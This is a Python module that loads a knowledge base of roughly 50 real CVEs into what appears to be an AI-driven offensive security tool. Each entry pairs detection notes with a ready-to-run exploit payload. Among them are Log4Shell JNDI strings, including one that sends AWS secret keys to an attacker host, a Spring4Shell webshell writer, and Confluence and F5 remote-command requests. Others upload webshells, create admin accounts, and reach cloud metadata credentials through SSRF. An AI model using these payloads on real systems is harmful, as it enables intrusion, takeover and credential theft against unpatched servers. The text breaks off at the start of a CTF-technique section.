"""
Training Modules — Specialized knowledge injection for Phantom's AI.

Three modules that inject curated security knowledge into the KnowledgePattern table:
1. CVE Replay Knowledge — 50+ real-world CVEs with detection & exploitation details
2. CTF Technique Knowledge — 40+ CTF/HackTheBox/TryHackMe methodologies
3. HackerOne Report Analysis — 30+ publicly disclosed bug bounty reports

Each module is independently callable and idempotent (skips existing patterns).
"""
import logging
from datetime import datetime

from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.models.knowledge import KnowledgePattern

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Shared helpers
# ---------------------------------------------------------------------------

async def _inject_patterns(db: AsyncSession, patterns: list[dict], dedup_key_field: str) -> dict:
    """
    Insert patterns idempotently. Deduplicates by pattern_type + the value of
    `dedup_key_field` inside pattern_data.

    Returns {"created": int, "skipped": int, "categories": {pattern_type: count}}.
    """
    stats = {"created": 0, "skipped": 0, "categories": {}}

    for p in patterns:
        key_value = p["pattern_data"].get(dedup_key_field, "")
        existing = await db.execute(
            select(KnowledgePattern).where(
                KnowledgePattern.pattern_type == p["pattern_type"],
                KnowledgePattern.pattern_data[dedup_key_field].as_string() == key_value,
            ).limit(1)
        )

        if existing.scalar_one_or_none():
            stats["skipped"] += 1
            continue

        record = KnowledgePattern(
            pattern_type=p["pattern_type"],
            technology=p.get("technology"),
            vuln_type=p.get("vuln_type"),
            pattern_data=p["pattern_data"],
            confidence=p.get("confidence", 0.9),
            sample_count=p.get("sample_count", 100),
        )
        db.add(record)
        stats["created"] += 1

        cat = p.get("technology") or p["pattern_type"]
        stats["categories"][cat] = stats["categories"].get(cat, 0) + 1

    await db.commit()
    return stats


# ═══════════════════════════════════════════════════════════════════════════
# MODULE 1: CVE Replay Knowledge
# ═══════════════════════════════════════════════════════════════════════════

def _cve_replay_patterns() -> list[dict]:
    """Return 50+ CVE exploit patterns organized by technology."""
    patterns = []

    def cve(tech, vuln, cve_id, description, affected, detection, exploit_payload, remediation, confidence=0.92):
        patterns.append({
            "pattern_type": "cve_exploit",
            "technology": tech,
            "vuln_type": vuln,
            "confidence": confidence,
            "sample_count": 50,
            "pattern_data": {
                "cve_id": cve_id,
                "description": description,
                "affected": affected,
                "detection": detection,
                "exploit_payload": exploit_payload,
                "remediation": remediation,
            },
        })

    # --- WordPress ---
    cve("wordpress", "xxe", "CVE-2021-29447",
        "WordPress XXE via media library WAV file upload. The XML metadata parser in libxml processes crafted iXML chunks allowing out-of-band data exfiltration.",
        "WordPress 5.6-5.7 with PHP 8",
        "Upload a WAV file with iXML chunk containing XXE entity definition; monitor for DNS/HTTP callbacks to attacker-controlled server.",
        'echo -en \'RIFF\\x00\\x00\\x00\\x00WAVEiXML\\x00\\x00\\x00\\x00<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER/xxe">]><r>&xxe;</r>\' > payload.wav',
        "Update WordPress to 5.7.1+. Disable XML external entity processing in PHP (libxml_disable_entity_loader).")

    cve("wordpress", "sqli", "CVE-2022-21661",
        "WordPress WP_Query SQL injection via crafted tax_query parameters. Improper sanitization of query terms allows blind SQL injection.",
        "WordPress < 5.8.3",
        "Send POST to REST API /wp/v2/posts with tax_query containing UNION-based injection in the 'field' parameter.",
        '{"tax_query": {"0": {"field": "term_taxonomy_id", "terms": ["1) UNION SELECT user_login,user_pass FROM wp_users-- -"]}}}',
        "Update WordPress to 5.8.3+. Use parameterized queries in custom themes/plugins.")

    cve("wordpress", "rce", "CVE-2019-8942",
        "WordPress authenticated RCE via crafted image with EXIF metadata containing PHP code, combined with path traversal in crop function to write into theme directory.",
        "WordPress < 5.0.1",
        "Check WP version via meta generator tag or /readme.html. Requires author-level credentials.",
        "Upload image with PHP payload in EXIF Comment field, then use image crop POST to move file to theme directory: POST /wp-admin/admin-ajax.php action=crop-image&id=MEDIA_ID",
        "Update WordPress to 5.0.1+. Restrict file upload capabilities.")

    cve("wordpress", "rce", "CVE-2020-25213",
        "WordPress File Manager plugin unauthenticated RCE via connector.minimal.php allowing arbitrary file upload.",
        "WP File Manager plugin 6.0-6.8",
        "Check for /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php returning 200.",
        "curl -F 'cmd=upload' -F 'target=l1_Lw' -F 'upload[]=@shell.php' http://TARGET/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
        "Update plugin to 6.9+. Remove connector.minimal.php if not needed.")

    cve("wordpress", "sqli", "CVE-2022-0739",
        "BookingPress plugin unauthenticated SQL injection via wpnonce in appointment booking.",
        "BookingPress < 1.0.11",
        "Check for /wp-content/plugins/bookingpress-appointment-booking/ and attempt injection via total_payable_amount parameter.",
        "curl 'http://TARGET/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=NONCE&category_id=1&total_payable_amount=1 UNION SELECT user_login,user_pass,3,4,5,6,7,8,9 FROM wp_users-- -'",
        "Update BookingPress to 1.0.11+.")

    # --- Apache ---
    cve("apache", "path_traversal", "CVE-2021-41773",
        "Apache 2.4.49 path traversal via URL-encoded dot-dot-slash sequences. When mod_cgi is enabled, allows RCE.",
        "Apache 2.4.49",
        "Send GET /cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd and check for /etc/passwd contents in response.",
        "curl -s --path-as-is 'http://TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'",
        "Update Apache to 2.4.51+. Ensure Require all denied for filesystem directories.")

    cve("apache", "path_traversal", "CVE-2021-42013",
        "Apache 2.4.50 path traversal bypass of CVE-2021-41773 fix using double URL encoding.",
        "Apache 2.4.49-2.4.50",
        "Send GET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd — double-encoded version of the traversal.",
        "curl -s --path-as-is 'http://TARGET/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd'",
        "Update Apache to 2.4.51+.")

    cve("apache", "privilege_escalation", "CVE-2019-0211",
        "Apache 2.4.17-2.4.38 local privilege escalation. Worker processes can manipulate the scoreboard and execute arbitrary code as root during graceful restart.",
        "Apache 2.4.17-2.4.38",
        "Check Apache version via Server header or /server-status. Requires local code execution (e.g., via PHP shell).",
        "Use the shared memory scoreboard manipulation exploit to overwrite the prefork_child_bucket->mutex->meth->postconfig function pointer, triggered on graceful restart.",
        "Update Apache to 2.4.39+.")

    cve("apache", "ssrf", "CVE-2021-40438",
        "Apache mod_proxy SSRF via crafted request URI allowing SSRF to internal services.",
        "Apache < 2.4.49 with mod_proxy",
        "Send request with unix: socket path in URL to access internal services via mod_proxy.",
        "curl 'http://TARGET/?unix:AAAAAA...4096chars...|http://internal-host/secret'",
        "Update Apache to 2.4.49+. Restrict mod_proxy configurations.")

    # --- Log4j ---
    cve("java", "rce", "CVE-2021-44228",
        "Log4Shell — Remote code execution in Apache Log4j2 via JNDI lookup in logged strings. Affects virtually all Java applications using Log4j2.",
        "Log4j2 2.0-beta9 to 2.14.1",
        "Inject ${jndi:ldap://ATTACKER/test} in any user input (User-Agent, X-Forwarded-For, form fields, API params). Monitor for DNS callback.",
        '${jndi:ldap://ATTACKER.com/exploit}\n${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.ATTACKER.com/a}\n${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}dap://ATTACKER.com/bypass}',
        "Update Log4j2 to 2.17.0+. Set log4j2.formatMsgNoLookups=true. Remove JndiLookup class from classpath.")

    cve("java", "rce", "CVE-2021-45046",
        "Log4Shell bypass — The initial fix (2.15.0) was incomplete. Certain non-default pattern layouts with Context Lookup allow JNDI injection via Thread Context Map.",
        "Log4j2 2.0-beta9 to 2.15.0",
        "Test with ${jndi:ldap://127.0.0.1#ATTACKER.com/a} using crafted thread context patterns.",
        "${jndi:ldap://127.0.0.1#ATTACKER.com:1389/a}",
        "Update Log4j2 to 2.17.0+. The 2.16.0 fix disabled JNDI by default but 2.17.0 is recommended.")

    cve("java", "dos", "CVE-2021-45105",
        "Log4j2 denial of service via infinite recursion in lookup evaluation with crafted string.",
        "Log4j2 2.0-alpha1 to 2.16.0",
        "Send ${${::-${::-$${::-j}}}} in logged input and check for StackOverflowError.",
        "${${::-${::-$${::-j}}}}",
        "Update Log4j2 to 2.17.0+.")

    # --- Spring ---
    cve("spring", "rce", "CVE-2022-22965",
        "Spring4Shell — RCE via data binding to Class object in Spring MVC with JDK 9+ on Tomcat. Allows writing JSP webshell via AccessLogValve manipulation.",
        "Spring Framework 5.3.0-5.3.17, 5.2.0-5.2.19 on JDK 9+ with Tomcat",
        "Send POST with class.module.classLoader.resources.context.parent.pipeline.first.* parameters and check for 200 OK.",
        'curl -X POST "http://TARGET/endpoint" -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="',
        "Update Spring Framework to 5.3.18+ or 5.2.20+. Use JDK 8 if possible. Add disallowedFields for class.* binding.")

    cve("spring", "rce", "CVE-2022-22963",
        "Spring Cloud Function SpEL injection via spring.cloud.function.routing-expression header allowing arbitrary command execution.",
        "Spring Cloud Function 3.1.6, 3.2.2 and older",
        "Send POST with header spring.cloud.function.routing-expression containing SpEL runtime exec.",
        'curl -X POST "http://TARGET/functionRouter" -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\'id\')" -d "test"',
        "Update Spring Cloud Function to 3.1.7+ or 3.2.3+.")

    cve("spring", "rce", "CVE-2018-1270",
        "Spring Framework RCE via STOMP WebSocket message with SpEL selector header.",
        "Spring Framework 5.0-5.0.4, 4.3-4.3.14",
        "Connect to WebSocket STOMP endpoint and send SUBSCRIBE with selector header containing SpEL expression.",
        'SUBSCRIBE\nselector:T(java.lang.Runtime).getRuntime().exec(\'touch /tmp/pwned\')\nid:sub-0\ndestination:/topic/greetings\n\n\\x00',
        "Update Spring Framework to 5.0.5+ or 4.3.15+.")

    # --- PHP ---
    cve("php", "rce", "CVE-2024-4577",
        "PHP CGI argument injection on Windows via Best-Fit character mapping. Soft hyphen (0xAD) maps to actual hyphen, bypassing CVE-2012-1823 fix.",
        "PHP 8.1 < 8.1.29, 8.2 < 8.2.20, 8.3 < 8.3.8 on Windows",
        "Send request with %AD in query string to PHP CGI handler. Check if it gets interpreted as a hyphen argument.",
        'curl "http://TARGET/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" -d "<?php system(\'whoami\'); ?>"',
        "Update PHP to 8.1.29+, 8.2.20+, or 8.3.8+. Migrate from PHP CGI to PHP-FPM.")

    cve("php", "rce", "CVE-2019-11043",
        "PHP-FPM + Nginx RCE. Specific Nginx fastcgi_split_path_info regex allows overwriting PHP-FPM env vars to achieve RCE.",
        "PHP 7.1.x < 7.1.33, 7.2.x < 7.2.24, 7.3.x < 7.3.11 with specific Nginx config",
        "Use phuip-fpizdam tool to detect: send URLs with %0a (newline) in path_info to trigger env var overwrite.",
        "phuip-fpizdam http://TARGET/index.php  # or manually: curl http://TARGET/index.php/foo%0abar.php?a=....padding....",
        "Update PHP. Fix Nginx config: add try_files $uri =404 before fastcgi_pass. Use if (!-f $document_root$fastcgi_script_name) { return 404; }")

    cve("php", "rce", "CVE-2023-3824",
        "PHP buffer overflow in phar file reading leading to RCE.",
        "PHP 8.0 < 8.0.30, 8.1 < 8.1.22, 8.2 < 8.2.8",
        "Upload a crafted PHAR file and trigger file operations on it (file_exists, is_dir, etc.).",
        "Craft PHAR with oversized filename entry to trigger heap buffer overflow during metadata parsing.",
        "Update PHP to 8.0.30+, 8.1.22+, 8.2.8+. Disable phar:// wrapper via allow_url_fopen=Off.")

    # --- Node.js / Express ---
    cve("nodejs", "prototype_pollution", "CVE-2022-24999",
        "qs library prototype pollution via crafted query string. The qs module before 6.10.3 allows attackers to inject properties into Object.prototype.",
        "qs < 6.10.3 (Express < 4.17.3)",
        "Send request with query ?__proto__[polluted]=true and verify Object.prototype.polluted in response or behavior change.",
        "curl 'http://TARGET/endpoint?__proto__[isAdmin]=true'",
        "Update qs to 6.10.3+. Update Express to 4.17.3+.")

    cve("nodejs", "prototype_pollution", "CVE-2021-25945",
        "Prototype pollution in deep-defaults npm package allowing property injection.",
        "deep-defaults < 1.0.6",
        "Send JSON with __proto__ key in nested objects and check for pollution.",
        '{"__proto__": {"isAdmin": true, "role": "admin"}}',
        "Update deep-defaults. Use Object.create(null) for option objects.")

    cve("nodejs", "rce", "CVE-2023-32002",
        "Node.js policy bypass via Module._load allowing arbitrary module loading despite experimental policies.",
        "Node.js 16.x, 18.x, 20.x before respective patches",
        "Attempt to load blocked modules via require('node:module')._load bypass.",
        "process.binding('spawn_sync').spawn({file:'id',args:['id'],stdio:[{type:'pipe',readable:true}]})",
        "Update Node.js. Use additional sandboxing beyond experimental policies.")

    cve("nodejs", "path_traversal", "CVE-2017-14849",
        "Node.js 8.5.0 path module normalize bypass allowing directory traversal.",
        "Node.js 8.5.0",
        "Send request with /static/../../../etc/passwd path normalization bypass.",
        "curl 'http://TARGET/node_modules/../../../etc/passwd'",
        "Update Node.js from 8.5.0.")

    # --- Jenkins ---
    cve("jenkins", "rce", "CVE-2019-1003000",
        "Jenkins Script Security sandbox bypass via crafted Groovy meta-programming allowing arbitrary code execution.",
        "Jenkins Script Security Plugin < 1.50",
        "Access /script or pipeline editor. Check plugin version via /pluginManager/api/json.",
        'public class Evil { Evil() { "touch /tmp/pwned".execute() } }',
        "Update Script Security Plugin to 1.50+.")

    cve("jenkins", "lfi", "CVE-2024-23897",
        "Jenkins CLI arbitrary file read via args4j @-file argument expansion. Any CLI command reads first few lines of server files.",
        "Jenkins < 2.442, LTS < 2.426.3",
        "Use Jenkins CLI: java -jar jenkins-cli.jar -s http://TARGET/ help @/etc/passwd",
        "java -jar jenkins-cli.jar -s http://TARGET/ connect-node @/etc/passwd\njava -jar jenkins-cli.jar -s http://TARGET/ help @/proc/self/environ",
        "Update Jenkins to 2.442+ or LTS 2.426.3+. Disable CLI if not needed.")

    cve("jenkins", "rce", "CVE-2024-43044",
        "Jenkins agent-to-controller file read via ClassLoaderProxy#fetchJar allowing arbitrary file access from connected agents.",
        "Jenkins < 2.471, LTS < 2.462.2",
        "Requires a connected agent. Use agent to request arbitrary files via remoting ClassLoader.",
        "From compromised agent, use ClassLoaderProxy.fetchJar to read /etc/shadow or credentials.xml from controller.",
        "Update Jenkins to 2.471+ or LTS 2.462.2+.")

    # --- Confluence ---
    cve("confluence", "rce", "CVE-2022-26134",
        "Confluence Server OGNL injection via URI allowing unauthenticated RCE. The OGNL expression is evaluated when processing a crafted URI.",
        "Confluence Server 1.3.0 - 7.18.0",
        "Send GET /${...OGNL...}/ and check response headers for command output.",
        'curl -v "http://TARGET/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%2C%27utf-8%27%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%27X-Cmd-Response%27%2C%23a%29%29%7D/"',
        "Update Confluence to 7.4.17+, 7.13.7+, 7.14.3+, 7.15.2+, 7.16.4+, 7.17.4+, or 7.18.1+.")

    cve("confluence", "rce", "CVE-2023-22515",
        "Confluence Data Center broken access control allowing unauthenticated admin account creation via setup re-initialization.",
        "Confluence Data Center 8.0.0 - 8.5.1",
        "Send GET/POST to /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false then access /setup/setupadministrator.action.",
        'curl "http://TARGET/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false"\ncurl -X POST "http://TARGET/setup/setupadministrator.action" -d "username=hacker&fullName=Hacker&email=hacker@evil.com&password=Password1!&confirm=Password1!&setup-next-button=Next"',
        "Update to Confluence 8.3.3+, 8.4.3+, or 8.5.2+.")

    cve("confluence", "rce", "CVE-2023-22527",
        "Confluence template injection via OGNL in out-of-date Velocity template files allowing unauthenticated RCE.",
        "Confluence Data Center 8.0.x-8.5.3",
        "Send POST to /template/aui/text-inline.vm with label parameter containing OGNL expression.",
        'curl -X POST "http://TARGET/template/aui/text-inline.vm" -d "label=\\u0027%2b#request[\\u0027.KEY_velocity.struts2.context\\u0027].internalGet(\\u0027ognl\\u0027).findValue(#parameters.x,{})%2b\\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader(\\u0027X-Cmd-Response\\u0027,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\\u0027id\\u0027).getInputStream()))"',
        "Update to Confluence 8.5.4+ or 8.6.0+.")

    # --- GitLab ---
    cve("gitlab", "rce", "CVE-2021-22205",
        "GitLab CE/EE unauthenticated RCE via ExifTool metadata processing. Crafted DjVu file triggers command injection in ExifTool < 12.24.",
        "GitLab CE/EE 11.9-13.10.2",
        "Upload a crafted DjVu image file (as avatar or issue attachment) and check for command execution.",
        "Create DjVu file with metadata: (metadata (Copyright \"\\n\" . qx{id} . \"\\n\"))",
        "Update GitLab to 13.10.3+. Update ExifTool to 12.24+.")

    cve("gitlab", "account_takeover", "CVE-2023-7028",
        "GitLab password reset account takeover. By sending two email addresses in the reset request, the reset token is sent to attacker-controlled email.",
        "GitLab CE/EE 16.1-16.7.1",
        "Send password reset POST with user[email][]=victim@target.com&user[email][]=attacker@evil.com.",
        'curl -X POST "http://TARGET/users/password" -d "user[email][]=victim@target.com&user[email][]=attacker@evil.com"',
        "Update GitLab to 16.5.6+, 16.6.4+, or 16.7.2+.")

    cve("gitlab", "ssrf", "CVE-2021-22214",
        "GitLab CI lint API SSRF allowing unauthenticated access to internal network services.",
        "GitLab CE/EE 10.5-13.12.8",
        "Send POST to /api/v4/ci/lint with include directive pointing to internal service.",
        'curl -X POST "http://TARGET/api/v4/ci/lint" -H "Content-Type: application/json" -d \'{"content": "include:\\n  remote: http://169.254.169.254/latest/meta-data/iam/security-credentials/"}\'',
        "Update GitLab. Restrict outbound requests from CI lint.")

    # --- Grafana ---
    cve("grafana", "path_traversal", "CVE-2021-43798",
        "Grafana 8.x unauthenticated path traversal via plugin static file serving. Allows reading arbitrary files from the server.",
        "Grafana 8.0.0-beta1 to 8.3.0",
        "Send GET /public/plugins/PLUGIN_ID/../../../../../etc/passwd. Try common plugins: alertlist, graph, table, text.",
        "curl --path-as-is 'http://TARGET/public/plugins/alertlist/../../../../../../../../etc/passwd'",
        "Update Grafana to 8.3.1+. Restrict file access in reverse proxy.")

    cve("grafana", "ssrf", "CVE-2020-13379",
        "Grafana unauthenticated SSRF via avatar proxy redirect following.",
        "Grafana 3.0.1-7.0.1",
        "Send GET /avatar/HASH?d=http://internal-host:PORT/path and check if Grafana follows redirect.",
        "curl 'http://TARGET/avatar/test?d=http://169.254.169.254/latest/meta-data/'",
        "Update Grafana to 7.0.2+.")

    # --- Laravel ---
    cve("laravel", "rce", "CVE-2021-3129",
        "Laravel Ignition RCE via log file manipulation and phar deserialization. The _ignition/execute-solution endpoint allows writing to log files and triggering phar:// deserialization.",
        "Laravel < 8.4.3 with Ignition < 2.5.2",
        "Send POST to /_ignition/execute-solution and check if debug mode is enabled (Whoops error page).",
        'curl -X POST "http://TARGET/_ignition/execute-solution" -H "Content-Type: application/json" -d \'{"solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "username", "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"}}\'',
        "Update Ignition to 2.5.2+. Disable debug mode in production (APP_DEBUG=false).")

    cve("laravel", "info_disclosure", "CVE-2017-16894",
        "Laravel .env file exposure containing APP_KEY, database credentials, and API keys.",
        "Any Laravel with misconfigured web server",
        "Send GET /.env and check for APP_KEY= or DB_PASSWORD= in response body.",
        "curl -s 'http://TARGET/.env' | grep -E '(APP_KEY|DB_|MAIL_|AWS_)'",
        "Configure web server to deny access to dotfiles. Move .env outside web root.")

    # --- jQuery ---
    cve("jquery", "xss", "CVE-2020-11022",
        "jQuery XSS via htmlPrefilter. Passing untrusted HTML to jQuery DOM manipulation methods (.html(), .append(), etc.) can execute XSS even with sanitization.",
        "jQuery 1.2-3.4.x",
        "Check jQuery version via $.fn.jquery or jQuery.fn.jquery in console. Test with <img src=x onerror=alert(1)> in .html() calls.",
        '<option><style></option></select><img src=x onerror=alert(document.domain)></style>',
        "Update jQuery to 3.5.0+. Use .text() instead of .html() for user content.")

    cve("jquery", "xss", "CVE-2020-11023",
        "jQuery XSS in .html() processing of <option> elements containing script content.",
        "jQuery 1.0.3-3.4.x",
        "Look for jQuery version and identify uses of .html()/.append() with user-controlled input.",
        "<option><style></option></select><img src=x onerror=alert(1)></style>",
        "Update jQuery to 3.5.0+.")

    # --- Docker ---
    cve("docker", "container_escape", "CVE-2019-5736",
        "runc container escape via /proc/self/exe overwrite. A malicious container can overwrite the host runc binary and gain root on the host.",
        "runc < 1.0.0-rc6, Docker < 18.09.2",
        "Check runc version: docker info | grep runc. Check Docker version < 18.09.2.",
        "#!/bin/bash\n# From within container:\ncp /bin/sh /bin/sh.bak\ncat > /bin/sh <<'EOF'\n#!/proc/self/exe\nEOF\n# When host executes runc (docker exec), the host binary is overwritten",
        "Update Docker to 18.09.2+. Update runc to 1.0.0-rc6+. Use user namespaces.")

    cve("docker", "container_escape", "CVE-2020-15257",
        "Containerd host networking container escape. Containers sharing host network namespace can access containerd's abstract unix socket.",
        "containerd < 1.3.9, < 1.4.3",
        "Check if container uses --net=host. Look for abstract unix socket @/containerd-shim/.*sock.",
        "Connect to containerd's abstract unix socket from within a host-networked container and use containerd API to escape.",
        "Update containerd to 1.3.9+ or 1.4.3+. Avoid --net=host.")

    # --- Nginx ---
    cve("nginx", "misconfiguration", "CVE-2017-7529",
        "Nginx integer overflow in range filter allowing information disclosure of upstream server memory.",
        "Nginx 0.5.6-1.13.2",
        "Send Range header with large negative value: Range: bytes=-17208,-9223372036854758792",
        "curl -H 'Range: bytes=-17208,-9223372036854758792' http://TARGET/",
        "Update Nginx to 1.13.3+. Disable max_ranges or set max_ranges 1.")

    # --- Tomcat ---
    cve("tomcat", "rce", "CVE-2017-12617",
        "Apache Tomcat PUT method RCE via JSP file upload when readonly init parameter is set to false.",
        "Tomcat 7.0.0-7.0.81, 8.0.0-8.0.46, 8.5.0-8.5.22, 9.0.0.M1-9.0.0",
        "Send PUT with .jsp extension (may need trailing / on Windows): PUT /evil.jsp/ HTTP/1.1",
        'curl -X PUT "http://TARGET/cmd.jsp/" -d \'<% out.println("uid: " + Runtime.getRuntime().exec("id")); %>\'',
        "Update Tomcat. Set readonly=true in default servlet configuration (conf/web.xml).")

    cve("tomcat", "info_disclosure", "CVE-2020-1938",
        "Ghostcat — Apache Tomcat AJP connector file read/inclusion. The AJP connector (port 8009) allows reading files and JSP inclusion from any accessible path.",
        "Tomcat 6.x, 7.x < 7.0.100, 8.x < 8.5.51, 9.x < 9.0.31",
        "Check if port 8009 (AJP) is open: nmap -p 8009 TARGET",
        "python3 ajpShooter.py http://TARGET 8009 /WEB-INF/web.xml read\n# Or use AJPy: ajp_ghost.py TARGET 8009 --read /WEB-INF/web.xml",
        "Update Tomcat. Disable AJP connector if not needed. Bind AJP to localhost only. Set secret/requiredSecret on AJP connector.")

    # --- Elasticsearch ---
    cve("elasticsearch", "rce", "CVE-2015-1427",
        "Elasticsearch Groovy scripting sandbox bypass allowing arbitrary code execution via search queries.",
        "Elasticsearch 1.3.0-1.3.7, 1.4.0-1.4.2",
        "Send search query with Groovy script using Runtime.exec: POST /_search with script field.",
        'curl -X POST "http://TARGET:9200/_search" -d \'{"script_fields": {"exec": {"script": "java.lang.Runtime.getRuntime().exec(\\"id\\")"}}}\'',
        "Update Elasticsearch to 1.3.8+ or 1.4.3+. Disable dynamic scripting.")

    # --- Redis ---
    cve("redis", "rce", "CVE-2022-0543",
        "Redis Lua sandbox escape on Debian/Ubuntu via package library allowing arbitrary command execution.",
        "Redis on Debian/Ubuntu with Lua 5.1",
        "Connect to unauth Redis and attempt Lua eval: EVAL 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); return f:read(\"*a\")' 0",
        'redis-cli -h TARGET EVAL \'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); return f:read("*a")\' 0',
        "Update Redis. Restrict network access. Enable AUTH. Disable Lua scripting if not needed.")

    # --- Varnish ---
    cve("varnish", "cache_poisoning", "CVE-2019-20637",
        "Varnish Cache HTTP/1 request smuggling via duplicate Content-Length headers leading to cache poisoning.",
        "Varnish < 6.0.5, < 6.2.2",
        "Send request with duplicate Content-Length headers and check for inconsistent caching behavior.",
        "Send request with two Content-Length headers with different values to poison cache with attacker-controlled response.",
        "Update Varnish to 6.0.5+ or 6.2.2+.")

    # --- Exim ---
    cve("exim", "rce", "CVE-2019-10149",
        "Exim MTA RCE via recipient address. Crafted RCPT TO address triggers command execution during delivery.",
        "Exim 4.87-4.91",
        "Check Exim version via SMTP banner: telnet TARGET 25. Check for Exim 4.87-4.91.",
        'RCPT TO:<${run{/bin/bash -c "id > /tmp/pwned"}}@localhost>',
        "Update Exim to 4.92+.")

    # --- Citrix / NetScaler ---
    cve("citrix", "path_traversal", "CVE-2019-19781",
        "Citrix ADC/NetScaler path traversal allowing unauthenticated RCE via crafted template files.",
        "Citrix ADC/NetScaler Gateway",
        "Send GET /vpn/../vpns/cfg/smb.conf and check for 200 response indicating traversal works.",
        'curl "http://TARGET/vpn/../vpns/portal/scripts/newbm.pl" -d "url=http://ATTACKER&title=\\`id\\`&desc=a&UI_inuse=a"',
        "Apply Citrix patches. Block /vpns/ paths at WAF.")

    # --- F5 BIG-IP ---
    cve("f5", "rce", "CVE-2022-1388",
        "F5 BIG-IP iControl REST authentication bypass allowing unauthenticated RCE via X-F5-Auth-Token manipulation.",
        "BIG-IP 16.1.x < 16.1.2.2, 15.1.x < 15.1.5.1, 14.1.x < 14.1.4.6, 13.1.x < 13.1.5",
        "Send request to /mgmt/tm/util/bash with Connection: X-F5-Auth-Token and empty X-F5-Auth-Token header.",
        'curl -sk -H "Content-Type: application/json" -H "Connection: X-F5-Auth-Token, X-Forwarded-Host" -H "X-F5-Auth-Token: anything" "https://TARGET/mgmt/tm/util/bash" -d \'{"command":"run","utilCmdArgs":"-c id"}\'',
        "Update BIG-IP. Restrict access to management interface.")

    # --- VMware ---
    cve("vmware", "rce", "CVE-2021-21972",
        "VMware vCenter Server unauthenticated RCE via vROps (vRealize Operations) API endpoint file upload.",
        "vCenter Server 6.5-7.0 U1c",
        "Send POST to /ui/vropspluginui/rest/services/uploadova and check for 200/405 (not 401/404).",
        'curl -X POST "https://TARGET/ui/vropspluginui/rest/services/uploadova" -F "uploadFile=@shell.jsp"',
        "Update vCenter Server. Disable vROPS plugin if not needed.")

    # --- Atlassian Jira ---
    cve("jira", "ssrf", "CVE-2019-8451",
        "Jira Server-Side Request Forgery via /plugins/servlet/gadgets/makeRequest endpoint.",
        "Jira < 8.4.0",
        "Send GET /plugins/servlet/gadgets/makeRequest?url=http://169.254.169.254/latest/meta-data/",
        'curl "http://TARGET/plugins/servlet/gadgets/makeRequest?url=http://169.254.169.254/latest/meta-data/"',
        "Update Jira to 8.4.0+.")

    cve("jira", "info_disclosure", "CVE-2020-14179",
        "Jira unauthenticated information disclosure via /secure/QueryComponent!Default.jspa exposing custom field names and project details.",
        "Jira < 8.12.0",
        "Send GET /secure/QueryComponent!Default.jspa without authentication.",
        'curl -s "http://TARGET/secure/QueryComponent!Default.jspa" | grep -o "customfield_[0-9]*"',
        "Update Jira to 8.12.0+.")

    return patterns


async def inject_cve_replay_knowledge(db: AsyncSession) -> dict:
    """Inject 50+ real-world CVE exploit patterns into the knowledge base."""
    patterns = _cve_replay_patterns()
    stats = await _inject_patterns(db, patterns, dedup_key_field="cve_id")
    logger.info(f"CVE Replay injection: {stats['created']} created, {stats['skipped']} skipped ({len(patterns)} total)")
    return stats


# ═══════════════════════════════════════════════════════════════════════════
# MODULE 2: CTF Technique Knowledge
# ═══════════════════════════════════════════════════════════════════════════

def _ctf_technique_patterns() -> list[dict]:
    """Return 40+ CTF technique patterns from HackTheBox/TryHackMe methodologies."""
    patterns = []

    def ctf(name, category, vuln, tech, description, detection, exploit_steps, example_payload, difficulty, confidence=0.88):
        patterns.append({
            "pattern_type": "ctf_technique",
            "technology": tech,
            "vuln_type": vuln,
            "confidence": confidence,
            "sample_count": 30,
            "pattern_data": {
                "name": name,
                "category": category,
                "description": description,
                "detection": detection,
                "exploit_steps": exploit_steps,
                "example_payload": example_payload,
                "difficulty": difficulty,
            },
        })

    # === Web Techniques ===

    ctf("JWT None Algorithm", "web", "auth_bypass", "jwt",
